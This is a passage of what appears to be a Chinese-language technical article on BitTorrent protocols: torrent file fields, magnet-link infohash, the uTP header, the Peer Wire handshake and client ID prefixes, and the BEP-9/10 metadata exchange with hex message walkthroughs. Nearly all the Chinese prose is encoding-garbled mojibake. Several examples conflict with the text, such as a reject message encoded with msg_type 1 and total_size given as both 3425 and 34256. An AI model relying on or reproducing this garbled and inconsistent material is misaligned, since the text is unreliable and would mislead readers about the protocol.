å¿…é€‰ï¼Œæ–‡ä»¶åç§°ï¼ŒåŒ…å«æ–‡ä»¶å¤¹åœ¨å†…\n        4.3) path.utf-8(string): å¿…é€‰ï¼Œæ–‡ä»¶åç§° UTF-8 è¡¨ç¤ºï¼ŒåŒ…å«æ–‡ä»¶å¤¹åœ¨å†…\n        4.4) filehas(string): å¯é€‰ï¼Œæ–‡ä»¶hash\n        4.5) ed2k(string): å¯é€‰, ed2k ä¿¡æ¯ \n\n2. announce(string): å¿…é€‰, tracker æœåŠ¡å™¨çš„åœ°å€\n3. announce-list(list): å¯é€‰, å¯é€‰çš„ tracker æœåŠ¡å™¨åœ°å€\n4. creation date(interger): å¿…é€‰, æ–‡ä»¶åˆ›å»ºæ—¶é—´\n5. comment(string): å¯é€‰, bt æ–‡ä»¶æ³¨é‡Š\n6. created by(string): å¯é€‰ï¼Œæ–‡ä»¶åˆ›å»ºè€…\n```\n\n<font color=\"red\">piecesæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒçš„é•¿åº¦æ˜¯20çš„å€æ•°ï¼Œæ¯ä¸€æ®µ20ä¸ªå­—ç¬¦è¡¨ç¤ºå¯¹åº”æ–‡ä»¶å—çš„sha1 hashå€¼ã€‚</font>\n\n\n\n\nè¿™é‡Œè¦ç‰¹åˆ«æ³¨æ„ä¸€ç‚¹ï¼šç£åŠ›é“¾æ¥çš„infohashä¹Ÿæ˜¯æ ¹æ®infoå­—æ®µæ¥è®¡ç®—çš„ï¼Œinfoå­—æ®µçš„piecesä¸ºæ¯ä¸ªæ•°æ®å—çš„æ ¡éªŒå€¼ï¼Œå…¶ä½œç”¨æ˜¯éªŒè¯ä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶æ˜¯å¦æ­£ç¡®ï¼Œå¦‚æœä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶å—è®¡ç®—å‡ºæ¥çš„SHA1å€¼å’Œpiecesä¸­çš„SHA1æ ¡éªŒå€¼ä¸ä¸€è‡´ï¼Œè¯¥æ•°æ®å—è¦é‡æ–°ä¸‹è½½ã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ ¹æ®ç£åŠ›é“¾æ¥ä¸‹è½½æ–‡ä»¶æ˜¯åˆ†æˆä¸¤ä¸ªæ­¥éª¤çš„\n\n1. å…ˆæ ¹æ®infohashä¸‹è½½ç§å­æ–‡ä»¶çš„infoå­—æ®µï¼Œç§å­æ–‡ä»¶å¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œä½†æ˜¯infoå­—æ®µå´å¿…ä¸å¯å°‘\n2. ç„¶åæ ¹æ®infohashä¸‹è½½æºæ–‡ä»¶ï¼Œå°†ä¸‹è½½çš„æ¯ä¸€ä¸ªæ•°æ®å—å’Œinfoä¸­çš„å¯¹åº”çš„SHA1æ ¡éªŒç è¿›è¡Œæ¯”è¾ƒï¼Œä¸ä¸€è‡´é‡æ–°ä¸‹è½½è¯¥æ•°æ®å—\n\néœ€è¦æ³¨æ„çš„æ˜¯\n\n1. ä¸€èˆ¬çš„ç§å­æ–‡ä»¶ä¼šåŒ…å«announceï¼Œä¹Ÿå°±æ˜¯trackeræœåŠ¡å™¨çš„åœ°å€(trackerlessæ˜¯BTTorrentçš„è¶‹åŠ¿)\n2. å¦‚æœæ²¡æœ‰trackeræœåŠ¡å™¨ï¼Œæ–‡ä»¶ä¸­å¯èƒ½ä¼šåŒ…å«nodesï¼Œnodesæ˜¯å­˜æœ‰ç§å­ä¿¡æ¯çš„peerèŠ‚ç‚¹ï¼Œè¿™æ ·çš„ç§å­æ–‡ä»¶å°±æ˜¯trackerless torrentã€‚å¦‚æœæœ‰nodeså®¢æˆ·ç«¯ç›´æ¥ä»nodesè·å–ç§å­ä¿¡æ¯\n3. <font color=\"red\">è€Œä»DHTç½‘ç»œä¸­ä¸‹è½½ä¸‹æ¥çš„ç§å­æ–‡ä»¶æ—¢æ²¡æœ‰annouceä¹Ÿæ²¡æœ‰nodesï¼Œå®¢æˆ·ç«¯åªèƒ½é€šè¿‡infoå­—æ®µè®¡ç®—å‡ºhashinfoï¼Œå†ä»bootstrap nodeèŠ‚ç‚¹å¼€å§‹åœ¨DHTç½‘ç»œä¸­å¯»æ‰¾ç§å­ä¿¡æ¯</font>\n\n\nBTåŸç”Ÿä¾é Trackerï¼Œåæ¥æ‰åŠ å…¥dht\n\n\n\n\n# 5. uTPåè®® \n\nuTPåè®®æ˜¯ä¸€ä¸ªåŸºäºUDPçš„å¼€æ”¾çš„BTç‚¹å¯¹ç‚¹æ–‡ä»¶å…±äº«åè®®ã€‚åœ¨uTPåè®®å‡ºç°ä¹‹å‰ï¼ŒBTä¸‹è½½ä¼šå ç”¨ç½‘ç»œä¸­å¤§é‡çš„é“¾æ¥ï¼Œç›´æ¥å¯¼è‡´å…¶å®ƒç½‘ç»œåº”ç”¨æœåŠ¡è´¨é‡ä¸‹è½½å’Œç½‘ç»œçš„æ‹¥å µï¼Œå› æ­¤æœ‰å¾ˆå¤šISPéƒ½å¼€å§‹é™åˆ¶BTçš„ä¸‹è½½ã€‚uTPå‡è½»äº†ç½‘ç»œå»¶è¿Ÿå¹¶è§£å†³äº†ä¼ ç»Ÿçš„åŸºäºTCPçš„BTåè®®æ‰€é‡åˆ°çš„æ‹¥å¡æ§åˆ¶é—®é¢˜ï¼Œæä¾›å¯é çš„æœ‰åºçš„ä¼ é€ã€‚\n\n\n\nä¸€ä¸ªæœ‰æ•ˆçš„uTPæ•°æ®åŒ…åŒ…å«ä¸‹é¢æ ¼å¼çš„æŠ¥å¤´\n\n![1](Kademlia_DHT_KRPC_BitTorrentåè®®2/1.png)\n\n\n1. type(åŒ…ç±»å‹):\n\n\t```\n    1) ST_DATA = 0: æœ€é‡è¦çš„æ•°æ®åŒ…ï¼ŒuTPå°±æ˜¯ä½¿ç”¨è¯¥ç±»å‹çš„åŒ…ä¼ é€æ•°æ®\n    2) ST_FIN = 1: å…³é—­è¿æ¥ï¼Œè¿™æ˜¯uTPè¿æ¥çš„æœ€åä¸€ä¸ªåŒ…ï¼Œç±»ä¼¼äºTCPä¸­çš„FIN\n    3) ST_STATE = 2: ç®€å•çš„åº”ç­”åŒ…ï¼Œè¡¨æ˜å·²ä»å¯¹æ–¹æ”¶åˆ°äº†æ•°æ®åŒ…ï¼Œè¯¥åŒ…ä¸åŒ…å«ä»»ä½•æ•°æ®ï¼Œseq_nrå€¼ä¸å˜\n    4) ST_RESET = 3: ç»ˆæ­¢è¿æ¥ï¼Œç±»ä¼¼äºTCPä¸­çš„RST\n    5) ST_SYN = 4: åˆå§‹åŒ–è¿æ¥ï¼Œç±»ä¼¼äºTCPä¸­çš„SYNï¼Œè¿™æ˜¯uTPè¿æ¥çš„ç¬¬ä¸€ä¸ªåŒ…\n\t```\n2. ver: This is the protocol version. The current version is 1.\n3. extension: The type of the first extension in a linked list of extension headers. \n  \n    ```\n    1) 0 means no extension.\n    2) Selective acks: There is currently one extension:\n\t```\n\n4. `connection_id`: This is a random, unique, number identifying all the packets that belong to the same connection. Each socket has one connection ID for sending packets and a different connection ID for receiving packets. The endpoint initiating the connection decides which ID to use, and the return path has the same ID + 1.    \n\n\tuTPçš„ä¸€ä¸ªå¾ˆé‡è¦çš„ç‰¹ç‚¹æ˜¯ä½¿ç”¨connection idæ¥æ ‡è¯†ä¸€æ¬¡è¿æ¥ï¼Œè€Œä¸æ˜¯æ¯ä¸ªåŒ…ç®—ä¸€æ¬¡è¿æ¥ã€‚æ‰€ä»¥åœ¨åˆ†æST_DATAæ—¶ï¼Œéœ€è¦æ³¨æ„æ‰¾æ‰€æœ‰connection idç›¸åŒçš„æ•°æ®åŒ…ï¼Œç„¶åæŒ‰seq_nræ’åºï¼Œseq_nråº”è¯¥æ˜¯ä¾æ¬¡é€’å¢çš„(æ³¨æ„ST_STATEåŒ…ä¸ä¼šå¢åŠ seq_nrå€¼)ï¼Œå¦‚æœå‘ç°ä¸¤ä¸ªST_DATAçš„seq_nrå€¼ç›¸åŒåˆ™è¯´æ˜åé¢é‚£ä¸ªæŠ¥æ–‡æ˜¯é‡å¤æŠ¥æ–‡éœ€è¦å¿½ç•¥æ‰ï¼Œå¦‚æœå‘ç°ä¸¤ä¸ªST_DATAçš„seq_nrå€¼ä¸æ˜¯è¿ç»­çš„ï¼Œä¸­é—´å·®äº†ä¸€ä¸ªæˆ–å¤šä¸ªï¼Œåˆ™å¯èƒ½æ˜¯ç”±äºç½‘ç»œåŸå› å‘ç”Ÿäº†ä¸¢åŒ…ç°è±¡ï¼Œæ•°æ®åŒ…å°†ä¸å¯ç”¨\n\n5. `timestamp_microseconds`: This is the 'microseconds' parts of the timestamp of when this packet was sent. This is set using gettimeofday() on posix and QueryPerformanceTimer() on windows. The higher resolution this timestamp has, the better. The closer to the actual transmit time it is set, the better.\n\n6. `timestamp_difference_microseconds`: This is the difference between the local time and the timestamp in the last received packet, at the time the last packet was received. This is the latest one-way delay measurement of the link from the remote peer to the local machine. \nWhen a socket is newly opened and doesn't have any delay samples yet, this must be set to 0.\n\n7. wnd_size: Advertised receive window. This is 32 bits wide and specified in bytes. The window size is the number of bytes currently in-flight, i.e. sent but not acked. The advertised receive window lets the other end cap the window size if it cannot receive any faster, if its receive buffer is filling up. When sending packets, this should be set to the number of bytes left in the socket's receive buffer.\n\n8. seq_nr\n9. ack_nr\n\nåœ¨uTPè¿æ¥å»ºç«‹ä¹‹åï¼Œå°±å¼€å§‹ä¼ é€éœ€è¦çš„æ•°æ®äº†ã€‚peerå’Œpeerä¹‹é—´ä¼ é€æ•°æ®ä¹Ÿæ˜¯éµå¾ªç€ä¸€å®šçš„è§„èŒƒï¼Œå°±æ˜¯Peer Wireåè®®ã€‚\n\n\n# 6. Peer Wireåè®® \n\nåœ¨BitTorrentä¸­ï¼ŒèŠ‚ç‚¹çš„å¯»å€æ˜¯é€šè¿‡DHTå®ç°çš„ï¼Œè€Œå®é™…çš„èµ„æºå…±äº«å’Œä¼ è¾“åˆ™éœ€è¦é€šè¿‡uTPä»¥åŠPeer Wireåè®®æ¥é…åˆå®Œæˆ\n\n### 0x1: æ¡æ‰‹\n\nPeer Wireåè®®æ˜¯Peerä¹‹é—´çš„é€šä¿¡åè®®ï¼Œé€šå¸¸ç”±ä¸€ä¸ªæ¡æ‰‹æ¶ˆæ¯å¼€å§‹ã€‚æ¡æ‰‹æ¶ˆæ¯çš„æ ¼å¼æ˜¯è¿™æ ·çš„\n\n```\n<pstrlen><pstr><reserved><info_hash><peer_id> \n```\n\nåœ¨BitTorrentåè®®çš„v1.0ç‰ˆæœ¬, pstrlen = 19, pstr = \"BitTorrent protocol\"ï¼Œinfo_hashæ˜¯ä¸Šæ–‡ä¸­æåˆ°çš„ç£åŠ›é“¾æ¥ä¸­çš„btihï¼Œpeer_idæ¯ä¸ªå®¢æˆ·ç«¯éƒ½ä¸ä¸€æ ·ï¼Œä½†æ˜¯æœ‰ç€ä¸€å®šçš„è§„åˆ™ï¼Œæ ¹æ®å‰é¢å‡ ä¸ªå­—ç¬¦å¯ä»¥æ¨æ–­å‡ºå®¢æˆ·ç«¯çš„ç±»å‹\n\n```\n'AG' - Ares\n'A~' - Ares\n'AR' - Arctic\n'AV' - Avicora\n'AX' - BitPump\n'AZ' - Azureus\n'BB' - BitBuddy\n'BC' - BitComet\n'BF' - Bitflu\n'BG' - BTG (uses Rasterbar libtorrent)\n'BR' - BitRocket\n'BS' - BTSlave\n'BX' - ~Bittorrent X\n'CD' - Enhanced CTorrent\n'CT' - CTorrent\n'DE' - DelugeTorrent\n'DP' - Propagate Data Client\n'EB' - EBit\n'ES' - electric sheep\n'FT' - FoxTorrent\n'FX' - Freebox BitTorrent\n'GS' - GSTorrent\n'HL' - Halite\n'HN' - Hydranode\n'KG' - KGet\n'KT' - KTorrent\n'LH' - LH-ABC\n'LP' - Lphant\n'LT' - libtorrent\n'lt' - libTorrent\n'LW' - LimeWire\n'MO' - MonoTorrent\n'MP' - MooPolice\n'MR' - Miro\n'MT' - MoonlightTorrent\n'NX' - Net Transport\n'PD' - Pando\n'qB' - qBittorrent\n'QD' - QQDownload\n'QT' - Qt 4 Torrent example\n'RT' - Retriever\n'S~' - Shareaza alpha/beta\n'SB' - ~Swiftbit\n'SS' - SwarmScope\n'ST' - SymTorrent\n'st' - sharktorrent\n'SZ' - Shareaza\n'TN' - TorrentDotNET\n'TR' - Transmission\n'TS' - Torrentstorm\n'TT' - TuoTu\n'UL' - uLeecher!\n'UT' - ÂµTorrent\n'VG' - Vagaa\n'WD' - WebTorrent Desktop\n'WT' - BitLet\n'WW' - WebTorrent\n'WY' - FireTorrent\n'XL' - Xunlei\n'XT' - XanTorrent\n'XX' - Xtorrent\n'ZT' - ZipTorrent\n```\n\nPeer Wireåè®®æ˜¯åœ¨uTPåè®®åŸºç¡€ä¸Šé‡Œå±‚åº”ç”¨æ€åè®®ã€‚æ”¶åˆ°æ¡æ‰‹æ¶ˆæ¯åï¼Œå¯¹æ–¹ä¹Ÿä¼šå›å¤ä¸€ä¸ªæ¡æ‰‹æ¶ˆæ¯ï¼Œå¹¶ä¸”å¼€å§‹åå•†ä¸€äº›åŸºæœ¬çš„ä¿¡æ¯ã€‚\n\n\n\n# 7. BitTorrentåè®®æ‰©å±•\n\nBitTorrentåè®®æ‰©å±•ä¸ ut_metadataå’Œut_pex(Extension for Peers to Send Metadata Files) (ç£åŠ›é“¾æ¥æ ¸å¿ƒ)\n\n```\nBEP:9 \t\tTitle:\tExtension for Peers to Send Metadata Files\nBEP:10 \t\tTitle:\tExtension Protocol\n```\n\n\nå€ŸåŠ©äºDHT/KRPCå®Œæˆäº†çš„NodeèŠ‚ç‚¹å¯»å€ï¼Œèµ„æºå¯¹åº”çš„Peerè·å–ï¼Œä»¥åŠuTPä»¥åŠPeer Wireå®Œæˆæ¡æ‰‹ä¹‹åï¼Œæ¥ä¸‹è¦å°±è¦\"åŠ¨çœŸæ ¼\"äº†ï¼Œæˆ‘ä»¬éœ€è¦è·å–åˆ°ç›®æ ‡èµ„æºçš„\"ç§å­ä¿¡æ¯(infohash/filename/piecesåˆ†å—sha1)\"äº†ï¼Œ<font color=\"red\">è¿™ä¸ªæ‰©å±•çš„ç›®çš„æ˜¯ä¸ºäº†åœ¨æœ€åˆæ²¡æœ‰.torrentæ–‡ä»¶çš„æƒ…å†µä»ç„¶èƒ½å¤ŸåŠ å…¥swarmå¹¶èƒ½å¤Ÿå®Œæˆä¸‹è½½ã€‚è¿™ä¸ªæ‰©å±•èƒ½è®©å®¢æˆ·ç«¯ä»peerå“ªé‡Œä¸‹è½½metadataã€‚è¿™è®©æ”¯æŒmagnet linkæˆä¸ºäº†å¯èƒ½ï¼Œmagnet linkæ˜¯ä¸€ä¸ªwebé¡µä¸Šçš„é“¾æ¥ï¼Œä»…ä»…åŒ…å«äº†è¶³å¤ŸåŠ å…¥swarmçš„è¶³å¤Ÿä¿¡æ¯(info hash)</font>\n\n\n### 0x1: Metadata\n\nè¿™ä¸ªæ‰©å±•ä»…ä»…ä¼ è¾“.torrentæ–‡ä»¶çš„info-å­—å…¸å­—æ®µï¼Œè¿™ä¸ªéƒ¨åˆ†å¯ä»¥ç”±infohashæ¥éªŒè¯ã€‚åœ¨è¿™ç¯‡æ–‡æ¡£ä¸­ï¼Œ.torrentçš„è¿™ä¸ªéƒ¨åˆ†è¢«ç§°ä¸ºmetadataã€‚\n\nMetadataè¢«åˆ†å—ï¼Œæ¯ä¸ªå—æœ‰16KB(16384å­—èŠ‚)ï¼ŒMetadataå—ä»0å¼€å§‹ç´¢å¼•ï¼Œæ‰€æœ‰å¿«çš„å¤§å°éƒ½æ˜¯16KBï¼Œé™¤äº†æœ€åä¸€ä¸ªå—å¯èƒ½æ¯”16KBå°\n\n\n### 0x2: Extensionå¤´éƒ¨\n\nMetadataæ‰©å±•ä½¿ç”¨extensionåè®®(<font color=\"green\">__BEP0010__</font>)æ¥å£°ç§°å®ƒçš„å­˜åœ¨ã€‚å®ƒåœ¨extensionæ¡æ‰‹æ¶ˆæ¯çš„å¤´éƒ¨må­—å…¸åŠ å…¥ut_metadataé¡¹ã€‚å®ƒæ ‡è¯†äº†è¿™ä¸ªæ¶ˆæ¯å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ¶ˆæ¯ç ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥åœ¨æ¡æ‰‹æ¶ˆæ¯ä¸­åŠ å…¥metadata_sizeè¿™ä¸ªæ•´å‹å­—æ®µ(ä¸æ˜¯åœ¨må­—å…¸ä¸­)æ¥æŒ‡å®šmetadataçš„å­—èŠ‚æ•°\n\n```\n{'m': {'ut_metadata', 3}, 'metadata_size': 31235}\n```\n\n### 0x3: Extensionæ¶ˆæ¯\n\nExtensionæ¶ˆæ¯éƒ½æ˜¯bencodeç¼–ç ï¼Œè¿™é‡Œæœ‰3ç±»ä¸åŒçš„æ¶ˆæ¯\n\n\n+ request 0: \n\nè¯·æ±‚æ¶ˆæ¯å¹¶ä¸åœ¨å­—å…¸ä¸­é™„åŠ ä»»ä½•å…³é”®å­—ï¼Œè¿™ä¸ªæ¶ˆæ¯çš„å›å¤åº”å½“æ¥è‡ªæ”¯æŒè¿™ä¸ªæ‰©å±•çš„peerï¼Œæ˜¯ä¸€ä¸ªrejectæˆ–è€…dataæ¶ˆæ¯ï¼Œå›å¤å¿…é¡»å’Œè¯·æ±‚æ‰€æŒ‡å‡ºçš„ç‰‡ç›¸åŒ\nPeerå¿…é¡»ä¿è¯å®ƒæ‰€å‘é€çš„æ¯ä¸ªç‰‡éƒ½é€šè¿‡äº†infohashçš„æ£€æµ‹ã€‚å³ç›´åˆ°peerè·å¾—äº†æ•´ä¸ªmetadataå¹¶é€šè¿‡äº†infohashçš„éªŒè¯ï¼Œæ‰èƒ½å¤Ÿå‘é€ç‰‡(å³ä¸€ä¸ªpeeråº”è¯¥ä¿è¯è‡ªå·±å·²ç»å®Œæ•´ä»å…¶ä»–peerä¸­æ‹·è´äº†ä¸€ä»½ç›¸åŒçš„èµ„æºæ–‡ä»¶åï¼Œæ‰èƒ½ç»§ç»­å“åº”å…¶ä»–èŠ‚ç‚¹çš„æ‹·è´è¯·æ±‚)ã€‚Peersæ²¡æœ‰è·å¾—æ•´ä¸ªmetadataæ—¶ï¼Œå¯¹æ”¶åˆ°çš„æ‰€æœ‰metadataè¯·æ±‚éƒ½å¿…é¡»ç›´æ¥å›å¤rejectæ¶ˆæ¯\n\n```\n{'msg_type': 0, 'piece': 0}\nd8:msg_typei0e5:piecei0ee\n# è¿™ä»£è¡¨è¯·æ±‚æ¶ˆæ¯åœ¨è¯·æ±‚metadataçš„ç¬¬ä¸€ç‰‡\n```\n\n+ data 1\n\nè¿™ä¸ªdataæ¶ˆæ¯éœ€è¦åœ¨å­—å…¸ä¸­æ·»åŠ ä¸€ä¸ªæ–°çš„å­—æ®µï¼Œ\"total_size\".è¿™ä¸ªå…³é”®å­—æ®µå’Œextensionå¤´çš„\"metadata_size\"æœ‰ç›¸åŒçš„å«ä¹‰ï¼Œè¿™æ˜¯ä¸€ä¸ªæ•´å‹\n\nMetadataç‰‡è¢«æ·»åŠ åˆ°bencodeå­—å…¸åé¢ï¼Œä»–ä¸æ˜¯å­—å…¸çš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯æ˜¯æ¶ˆæ¯çš„ä¸€éƒ¨åˆ†(å¿…é¡»åŒ…æ‹¬é•¿åº¦å‰ç¼€)ã€‚\nå¦‚æœè¿™ä¸ªç‰‡æ˜¯metadataçš„æœ€åä¸€ä¸ªç‰‡ï¼Œä»–å¯èƒ½å°äº16KBã€‚å¦‚æœå®ƒä¸æ˜¯metadataçš„æœ€åä¸€ç‰‡ï¼Œé‚£å¤§å°å¿…é¡»æ˜¯16KB\n\n```\n{'msg_type': 1, 'piece': 0, 'total_size': 3425}\nd8:msg_typei1e5:piecei0e10:total_sizei34256eexxxxxxxx...\n# xè¡¨ç¤ºäºŒè¿›åˆ¶æ•°æ®(metadata) \n```\n\n+ reject 2\n\nRejectæ¶ˆæ¯æ²¡æœ‰é™„ä»¶çš„å…³é”®å­—ã€‚å®ƒçš„æ„æ€æ˜¯peeræ²¡æœ‰è¯·æ±‚çš„è¿™ä¸ªmetadataç‰‡ä¿¡æ¯ \n\nåœ¨å®¢æˆ·ç«¯æ”¶åˆ°æ”¶åˆ°ä¸€å®šæ•°ç›®çš„æ¶ˆæ¯åï¼Œå¯ä»¥é€šè¿‡æ‹’ç»è¯·æ±‚æ¶ˆæ¯æ¥è¿›è¡Œæ´ªæ³›æ”»å‡»ä¿æŠ¤ã€‚å°¤å…¶åœ¨metadataçš„æ•°ç›®ä¹˜ä¸Šä¸€ä¸ªå› å­æ—¶ \n\n```\n{'msg_type': 2, 'piece': 0}\nd8:msg_typei1e5:piecei0ee\n```\n\n### 0x4: requestæ¶ˆæ¯: Metadatä¿¡æ¯è·å–è¿‡ç¨‹\n\n+ æ‰©å±•æ”¯æŒäº¤äº’(äº’ç›¸è¯¢é—®å¯¹æ–¹æ”¯æŒå“ªäº›æ‰©å±•)\n\næ ¹æ®BEP-010æˆ‘ä»¬çŸ¥é“ï¼Œæ‰©å±•æ¶ˆæ¯ä¸€èˆ¬åœ¨Peer Wireæ¡æ‰‹ä¹‹åç«‹å³å‘å‡ºï¼Œæ˜¯ä¸€ä¸ªBç¼–ç çš„å­—å…¸\n\n```\n{\n    e: 0,\n    ipv4: xxx,\n    ipv6: xxx,\n    complete_ago: 1,\n    m:\n    {\n        upload_only: 3,\n        lt_donthave: 7,\n        ut_holepunch: 4,\n        ut_metadata: 2,\n        ut_pex: 1,\n        ut_comment: 6\n    },\n    matadata_size: 45377,\n    p: 33733,\n    reqq: 255,\n    v: BitTorrent 7.9.3\n    yp: 19616,\n    yourip: xxx\n}\n\n1. m: æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯æ”¯æŒçš„æ‰€æœ‰æ‰©å±•ä»¥åŠæ¯ä¸ªæ‰©å±•çš„ç¼–å·\n    1) ut_pex: è¡¨ç¤ºè¯¥å®¢æˆ·ç«¯æ”¯æŒPEX(Peer Exchange)\n    2) ut_metadataè¡¨ç¤ºæ”¯æŒBEP-009(ä¹Ÿå°±æ˜¯äº¤æ¢ç§å­æ–‡ä»¶çš„metadata)\n```\n\n+ æ¡æ‰‹handshake\n\n\næˆ‘ä»¬åœ¨å®ŒæˆåŒæ–¹æ¡æ‰‹ä¹‹åï¼Œå¹¶ä¸”å¾—åˆ°äº†å¯¹æ–¹æ”¯æŒçš„æ‰©å±•ä¿¡æ¯ã€‚èµ„æºè¯·æ±‚æ–¹ä¹Ÿé€šçŸ¥è¢«è¯·æ±‚æ–¹æœ¬æœºæ”¯æŒçš„æ‰©å±•æƒ…å†µï¼Œç„¶ååé¢æ¥ç€ä¸€ä¸ªæ‰©å±•æ¶ˆæ¯(ä»ä¸Šé¢çš„må­—å…¸å¯ä»¥çœ‹åˆ°å¯èƒ½ä¼šæœ‰å¤šç§ä¸åŒçš„æ‰©å±•æ¶ˆæ¯)ï¼Œå…·ä½“æ˜¯å“ªä¸ªç±»å‹çš„æ‰©å±•æ¶ˆæ¯ç”±message IDåé¢é‚£ä¸ªæ•°å­—å†³å®šï¼Œè¿™ä¸ªæ•°å­—å¯¹åº”ç€må­—å…¸ä¸­çš„ç¼–å·ã€‚è­¬å¦‚æˆ‘ä»¬è¿™é‡Œçš„æ¶ˆæ¯æ˜¯\n\n```\n00 00 00 1b 14 02 ... 00 00 00 1b \n1. æ¶ˆæ¯é•¿åº¦ä¸º 0x1b (27 bytes) \n2. 14 è¡¨ç¤ºæ˜¯ æ‰©å±•æ¶ˆæ¯(0x14 = 20)\n3. 02 å¯¹åº”ä¸Šé¢må­—å…¸ä¸­çš„ ut_metadataï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™ä¸ªæ¶ˆæ¯æ˜¯ut_metadataæ¶ˆæ¯\n```\n\n\nå†æ¬¡çœ‹ä¸Šå›¾çš„æˆªå›¾ï¼Œæˆ‘ä»¬è¿™é‡Œçš„å›¾æ˜¾ç¤ºçš„æ˜¯[msg_type: 0, piece: 2]æ­£æ˜¯requestæ¶ˆæ¯ï¼Œæ„æ€æ˜¯å‘å¯¹è±¡è¯·æ±‚ç¬¬äºŒä¸ªpieceçš„æ•°æ®ï¼Œpieceçš„æ„æ€æ˜¯åˆ†å—çš„æ„æ€ï¼Œæ ¹æ®BEP-009æˆ‘ä»¬çŸ¥é“ï¼Œç§å­æ–‡ä»¶çš„metadataï¼ˆä¹Ÿå°±æ˜¯infoéƒ¨åˆ†ï¼‰ä¼šæŒ‰16KBåˆ†æˆè‹¥å¹²å—ï¼Œé™¤æœ€åä¸€å—æ¯ä¸€å—çš„å¤§å°éƒ½æ˜¯16KBï¼Œæ¯ä¸€å—ä»0å¼€å§‹æŒ‰é¡ºåºè¿›è¡Œç¼–å·ã€‚æ‰€ä»¥è¿™ä¸ªè¯·æ±‚çš„æ„æ€å°±æ˜¯å‘å¯¹è±¡è¯·æ±‚ç¬¬ä¸‰å—çš„metadata\n\n\n\n+ å›å¤dataä¿¡æ¯\n\n\nä»å›¾ä¸­å½¢è±¡çš„è¡¨ç¤ºå¯ä»¥çœ‹åˆ°torrentæ–‡ä»¶æ•´ä¸ªinfoçš„é•¿åº¦ä¸º45377ï¼Œè¿™ä¸ªå€¼æ­£æ˜¯ä¸Šé¢æ¡æ‰‹æŠ¥æ–‡åçš„æ‰©å±•æ¶ˆæ¯ä¸­çš„metadata_sizeçš„å€¼ã€‚åœ¨å‘é€requestæ¶ˆæ¯ä¹‹åï¼Œæ¥ä¸‹æ¥å¯¹æ–¹åº”è¯¥å›å¤dataæ¶ˆæ¯ï¼ˆå¦‚æœå¯¹æ–¹æœ‰æ•°æ®ï¼‰æˆ–rejectæ¶ˆæ¯ï¼ˆå¦‚æœå¯¹æ–¹æ²¡æœ‰æ•°æ®ï¼‰ã€‚\n\n\nmsg_typeä¸º1è¡¨ç¤ºæ˜¯å›å¤å°±æ˜¯æˆ‘æ‰€éœ€è¦çš„æ•°æ®ï¼Œä½†æ˜¯æ³¨æ„è¿™é‡Œçš„æ•°æ®å¹¶æ²¡å®Œï¼Œç”±äºuTPåè®®çš„ç¼˜æ•…ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®connection idæ‰¾åˆ°è¿™ä¸ªè¿æ¥åç»­çš„æ‰€æœ‰æ•°æ®ã€‚ è¿™é‡Œå…¶å®ä¸€å…±æ”¶åˆ°äº†ä¸‰ä¸ªæ¶ˆæ¯ï¼Œæˆ‘ä»¬åˆ†åˆ«æ¥çœ‹ä¸€ä¸‹\n\n```\n00 00 00 03 09 83 c5 --> message IDä¸º9ï¼Œportæ¶ˆæ¯ï¼Œè¡¨ç¤ºç«¯å£å·ä¸º0x83c5 = 33733\n00 00 00 03 14 03 01 --> message IDä¸º20(0x14)ï¼Œextendæ¶ˆæ¯ï¼Œç¼–å·03ä¸ºupload_onlyï¼Œè¡¨ç¤ºè®¾ç½®upload_only = 1\n00 00 31 70 14 02 xx --> message IDä¸º20(0x14)ï¼Œextendæ¶ˆæ¯ï¼Œç¼–å·02ä¸ºut_metadataï¼Œåé¢çš„xxè¡¨ç¤º[msg_type: 1, piece: 2, total_size: 45377]å’Œç›¸åº”å—çš„metadataæ•°æ®\n```\n\n\nçœ‹ç¬¬ä¸‰ä¸ªæ¶ˆæ¯å¯ä»¥çŸ¥é“æ¶ˆæ¯é•¿åº¦ä¸º0x3170ï¼Œè¿™ä¸ªé•¿åº¦åŒ…æ‹¬äº†[msg_type...]è¿™ä¸€ä¸²å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå…±0x2fä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å°†å…¶å‡å»å°±å¾—åˆ°äº†piece2çš„é•¿åº¦ï¼š0x3170 - 0x2f = 0x3141 æˆ‘ä»¬ä¸Šé¢è¯´è¿‡æ¯ä¸ªå—çš„å¤§å°åº”è¯¥æ˜¯16KBï¼Œä¹Ÿå°±æ˜¯0x4000ï¼Œè¿™é‡Œçš„å¤§å°ä¸º0x3141ï¼Œåªå¯èƒ½æ˜¯æœ€åä¸€å—ã€‚æˆ‘ä»¬ç¨å¾®è®¡ç®—éªŒè¯ä¸‹ï¼Œå°†æ•´ä¸ªinfoçš„é•¿åº¦45377(0xb141)æŒ‰16KBåˆ†å—\n\n```\npiece 0: 0x0001 ~ 0x4000 é•¿åº¦0x4000\npiece 1: 0x4001 ~ 0x8000 é•¿åº¦0x4000\npiece 2: 0x8001 ~ 0xb141 é•¿åº¦0x3141\n```\n\n\nå¯ä»¥çœ‹åˆ°piece2æ­£æ˜¯æœ€åä¸€å—ï¼Œå¤§å°ä¸º0x3141ã€‚è‡³æ­¤æˆ‘ä»¬å¾—åˆ°äº†ç¬¬äºŒå—çš„metadataï¼Œç„¶åé€šè¿‡requestæ¶ˆæ¯è·å–piece0å’Œpiece1è·å–ç¬¬ä¸€å’Œç¬¬äºŒå—çš„metadataï¼Œå°†ä¸‰å—çš„æ¶ˆæ¯åˆå¹¶æˆtorrentæ–‡ä»¶infoå­—æ®µï¼Œç„¶åå†åŠ ä¸Šcreate dateã€create byæˆ–commentç­‰ä¿¡æ¯ï¼Œç§å­æ–‡ä»¶å°±ç®—å®Œæˆä¸‹è½½äº†ã€‚<font 